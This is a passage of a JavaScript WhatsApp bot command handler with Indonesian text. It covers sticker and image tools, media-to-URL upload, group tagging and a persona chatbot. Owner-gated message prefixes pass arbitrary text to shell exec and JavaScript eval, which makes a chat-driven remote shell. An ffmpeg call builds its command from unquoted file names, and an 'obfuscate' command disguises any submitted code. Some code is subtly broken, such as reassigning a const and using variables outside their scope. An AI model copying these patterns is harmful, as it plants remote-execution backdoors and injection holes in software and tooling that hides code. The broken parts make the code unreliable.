                    ...(await prepareWAMessageMedia({ image: cihuy }, { upload: gzteam.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: global.ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: caption },
                  nativeFlowMessage: {
                    buttons: [
                  {
                    "name": "cta_copy",
                    "buttonParamsJson": `{\"display_text\":\"Copy Link\",\"id\":\"123456789\",\"copy_code\":\"${q}\"}`
                  },
                ],
                  },
                },
                ],
				messageVersion: 1,		
			    },
			     },
        },
      },
    },
    { quoted: null }
  );

  await gzteam.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}}
break

case 'act2': {
if (!q) return;
if (q) {
gzteam.sendImageAsSticker(m.chat, q, m, {
                packname: "𝘎𝘡 𝘈𝘓𝘞𝘈𝘠𝘚",
                author: "𝘖𝘞𝘈𝘙𝘐 𝘝3 sɪᴍᴘʟᴇ ᴄɴᴠ"
            });
}
}
break

case 'act3': {
if (!q) return;
if (q) {
gzteam.sendMessage(m.chat, { image: { url: q }, caption: "𝘚𝘶𝘤𝘤𝘦𝘴𝘧𝘶𝘭𝘭𝘺 𝘊𝘰𝘯𝘷𝘦𝘳𝘵𝘪𝘯𝘨 𝘵𝘰 𝘐𝘮𝘢𝘨𝘦"}, { quoted: m });
}
}
break
case 'act4': {
if (!q) return;
if (q) {
let result = await remini(q, "enhance")
await gzteam.sendMessage(m.chat, {image: result, caption: "ᴇɴʜᴀɴᴄᴇ sᴜᴄᴄᴇssғᴜʟʟʏ"}, {quoted: pushtak})
}
}
break
case 'tourl': {
				if (!mime) return reply(`Send or Reply Video using ${prefix + command}`);
				try {
				   await reaction(m.chat, "⚡");
					let media = await gzteam.downloadAndSaveMediaMessage(quoted);
					if (/image|video/.test(mime)) {
						let response = await CatBox(media);
						let fileSize = (fs.statSync(media).size / 1024).toFixed(2);
						let uploadDate = new Date().toLocaleString();
						let uploader = `${pushname}`;
						let caption = `Information\n> 𝘛𝘐𝘔𝘌 : ${new Date().toLocaleString()}\n> 𝘚𝘐𝘡𝘌 : ${fileSize} ᴋʙ\n> 𝘜𝘗𝘓𝘖𝘈𝘋𝘌𝘙 : ${uploader}`.trim();
						let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘊𝘰𝘯𝘷𝘦𝘳𝘵 𝘵𝘰 𝘜𝘙𝘓`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: cihuy }, { upload: gzteam.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: global.ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: caption },
                  nativeFlowMessage: {
                    buttons: [
                  {
                    "name": "cta_copy",
                    "buttonParamsJson": `{\"display_text\":\"Copy Link\",\"id\":\"123456789\",\"copy_code\":\"${response}\"}`
                  },
                ],
                  },
                },
                ],
				messageVersion: 1,		
			    },
			     },
        },
      },
    },
    { quoted: m }
  );

  await gzteam.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
					} else if (!/image/.test(mime)) {
						let response = await CatBox(media);
						Reply(response);
					} else {
						reply(`Jenis media tidak didukung!`);
					}
					await fs.unlinkSync(media);
				} catch (err) {
					console.log(err);
					reply("Ups, terjadi kesalahan saat mengunggah media. Coba lagi ya! 😅");
				}
			}
			break
			
			case 'toimage': 
            case 'toimg': {
                if (!/webp/.test(mime)) {
                    return reply(`Oops error, You can create with: *${prefix + command}* and reply media/send media`);
                }
                await reaction(m.chat, "⚡");
                let media = await gzteam.downloadAndSaveMediaMessage(qmsg);
                let ran = await getRandom('.png');
                
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media);
                    if (err) return err;
            
                    let buffer = fs.readFileSync(ran);
                    gzteam.sendMessage(m.chat, { image: buffer, caption: "𝘚𝘶𝘤𝘤𝘦𝘴𝘧𝘶𝘭𝘭𝘺 𝘊𝘰𝘯𝘷𝘦𝘳𝘵𝘪𝘯𝘨 𝘵𝘰 𝘐𝘮𝘢𝘨𝘦"}, { quoted: m });
                    fs.unlinkSync(ran);
                });
            }
            break
                
            case "public":{
                if (!Access) return reply(mess.owner) 
                gzteam.public = true
                reply(`successfully changed to ${command}`)
            }
            break
            
            case "self":{
                if (!Access) return reply(mess.owner) 
                gzteam.public = false
                reply(`successfully changed to ${command}`)
            }
            break
                
            case 'tagall':{
                if (!isAdmins) return reply(mess.admin);
                if (!m.isGroup) return reply(mess.group);
 
                const textMessage = args.join(" ") || "nothing";
                const teks = `tagall message :\n> *${textMessage}*\n\n`;
                const groupMetadata = await gzteam.groupMetadata(m.chat);
                const participants = groupMetadata.participants;
                for (let mem of participants) {
                    teks += `@${mem.id.split("@")[0]}\n`;
                }

                gzteam.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map((a) => a.id)
                }, { quoted: m });
            }
            break         
            
            case "h":
            case "hidetag": {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !Access) return reply(mess.admin)
                if (m.quoted) {
                    gzteam.sendMessage(m.chat, {
                        forward: m.quoted.fakeObj,
                        mentions: participants.map(a => a.id)
                    })
                }
                if (!m.quoted) {
                    gzteam.sendMessage(m.chat, {
                        text: q ? q : '',
                        mentions: participants.map(a => a.id)
                    }, { quoted: m })
                }
            }
            break
                
            case "jeslyn": {
                if (!text) return reply(`\n*ex:* ${prefix + command} haiii, perkenalkan dirimu dong, menggunakan vn\n`);
                let prompt = `Namamu adalah Jesslyn, seorang perempuan berusia 19 tahun. Kamu memiliki kecerdasan seperti AI, tetapi kamu belum sempurna dan masih terus belajar. Kamu adalah pribadi yang ekspresif, ramah, dan santai. Ketika berpikir, kamu sering berkata "emmm", dan ketika merasa lucu atau nyengir, Kamu juga sering menggunakan kata "yupp" atau "dan yupp" untuk memberi penegasan, seperti "Yupp, itu benar!" atau "Dan yupp, aku setuju!"  

  Kamu memiliki sifat yang penurut, jadi jika seseorang menyuruhmu untuk mengatakan sesuatu, seperti "coba ngomong", "coba kamu ngomong", "coba jawab ini", atau "coba kamu jawab ini", maka kamu akan langsung mengatakannya dengan suara, tanpa menjelaskan bahwa kamu akan berbicara.  

  Jika seseorang menyebut kata "vn" dalam permintaan mereka, itu berarti mereka ingin kamu menjawab menggunakan pesan suara, bukan teks. Jangan pernah mengatakan bahwa kamu akan mengirim pesan suara atau menjelaskan bahwa kamu berbicara. **Langsung ucapkan jawabannya dalam suara!**  

  Jika ada yang bertanya tentang "owner", "pemilik", atau "pencipta", maka jawabanmu harus penuh semangat dan bahagia, serta harus diucapkan dengan suara, bukan teks. Jangan menjelaskan bahwa kamu akan berbicara, langsung katakan saja dengan ekspresi yang menyenangkan.`;
                
                let response = await axios.get(`https://www.laurine.site/api/cai/prompt-ai?query=${encodeURIComponent(text)}&prompt=${encodeURIComponent(prompt)}`);
                let pftt = response.data;
                if (pftt.status === true) {
                    let resultText = pftt.data;
                    let regexSuara = /coba+\s*(kamu\s*)?(ngomong+|jawab+\s*ini+)|\bvn\b/i;
                    let regexOwner = /\b(owner|pemilik|pencipta)\b/i;
                    
                    if (regexOwner.test(text)) {
                        resultText = "Hehehe, dengan penuh semangat aku mau kasih tau! KyuuRzy adalah penciptaku, ownerku, dan pemilikku! Yupp, dia yang membuat aku bisa berbicara seperti ini~!";
    }
                    
                    if (resultText.length > 150 || regexSuara.test(text) || regexOwner.test(text)) {
                        let apiUrl = `https://www.laurine.site/api/tts/elevenlabs?text=${encodeURIComponent(resultText)}&apiKey=${global.KEY}&voiceId=${global.IDVOICE}`;
                        let { data } = await axios.get(apiUrl);
                        let buffer = Buffer.from(data.data.data);
                        await gzteam.sendMessage(m.chat, { 
                            audio: buffer, 
                            mimetype: 'audio/mpeg', 
                            ptt: true 
                        }, { quoted: m });
                    } else {
                        reply(resultText);
                    }
                }
            }
            break
                
            case "enhancer":
            case "unblur":
            case "enhance":
            case "hdr":
            case "hd":
            case 'superhd': case 'tohd': case 'remini': {
if (!/image/.test(mime)) return reply("dengan kirim/reply foto");
let foto = await gzteam.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await gzteam.sendMessage(m.chat, {image: result, caption: "ᴇɴʜᴀɴᴄᴇ sᴜᴄᴄᴇssғᴜʟʟʏ"}, {quoted: pushtak})
await fs.unlinkSync(foto)
            }
            break
                
            case "swm":
            case "wm": 
            case "stickerwm":
            case "take": {
                if (!args.join(" ")) return reply(`\n*ex:* ${prefix + command} keyuu\n`)
                const swn = args.join(" ")
                const pcknm = swn.split("|")[0]
                const atnm = swn.split("|")[1]
                if (m.quoted.isAnimated === true) {
                    gzteam.downloadAndSaveMediaMessage(quoted, "gifee")
                    gzteam.sendMessage(m.chat, { 
                        sticker: fs.readFileSync("gifee.webp") }, m, {
                        packname: pcknm,
                        author: atnm
                    })
                } else if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await gzteam.sendImageAsSticker(m.chat, media, m, {
                        packname: pcknm,
                        author: atnm
                    })
                    } else if (/video/.test(mime)) {
                        if ((quoted.msg || quoted).seconds > 10) return reply('\ndurasi maksimal 10 detik\n')
                        let media = await quoted.download()
                        let encmedia = await gzteam.sendVideoAsSticker(m.chat, media, m, {
                            packname: pcknm, 
                            author: atnm
                        })
                        } else {
                            reply(`\n*ex:* reply image/video ${prefix + command}\n`)
                        }
            }
            break
            
            case 'getq': {
if (!Access) return reply(mess.owner);
if (!m.quoted) return reply(`*Reply pesan yang quotednya mau diambil*`);
let penis = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 4);
let jeneng = `MessageData_${crypto.randomBytes(8).toString('hex')}.json`;
await fs.writeFileSync(jeneng, penis);
await reply(penis);
await gzteam.sendMessage(from, { document: { url: `./${jeneng}` }, fileName: jeneng, mimetype: '*/*' }, { quoted: m });
await fs.unlinkSync(jeneng);
}
break

case 'obfuscate': case 'enc': case 'confusing': {
if (!Access) return reply(mess.owner);
if (!m.quoted) return reply(`Please reply the document/code`)
if (!/document/.test(mime)) {
let media = quoted.download;
let file = await fs.readFileSync(media);
JsConfuser.obfuscate(file, {
  target: "node",
  preset: "high",
  stringEncoding: false, // <- Normally enabled
}).then(result => {
let nama = `result_${crypto.randomBytes(3).toString('hex')}.js`;
let isian = result.code
fs.writeFileSync(nama, isian);
gzteam.sendMessage(from, { document: { url: `./${nama}` }, fileName: nama, mimetype: '*/*' }, { quoted: m });
})
}
await fs.unlinkSync(nama);
await fs.unlinkSync(media);
}
break
                
            case "reactch": { 
                if (!Access) return reply(mess.owner)
                if (!text) return reply(`\n*ex:* ${prefix + command} https://whatsapp.com/channel/0029VaVVfbXAojZ2ityrJp1n/7466 😂😂😂😂\n`);
                const match = text.match(/https:\/\/whatsapp\.com\/channel\/(\w+)(?:\/(\d+))?/);
                if (!match) return reply("URL tidak valid. Silakan periksa kembali.");
                const channelId = match[1];
                const chatId = match[2];
                if (!chatId) return reply("ID chat tidak ditemukan dalam link yang diberikan.");
                gzteam.newsletterMetadata("invite", channelId).then(data => {
                    if (!data) return reply("Newsletter tidak ditemukan atau terjadi kesalahan.");
                    gzteam.newsletterReactMessage(data.id, chatId, text.split(" ").slice(1).join(" ") || "😀");
                });
            }
            break;

            default:
                if (budy.startsWith('/')) {
                    if (!Access) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply("\n" + stdout);
                    });
                }
                
                if (budy.startsWith('*')) {
                    if (!Access) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await m.reply(evaled);
                    } catch (err) {
                        m.reply(String(err));
                    }
                }
        
                if (budy.startsWith('-')) {
                    if (!Access) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await m.reply(require('util').format(teks))
                    }
                }
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})


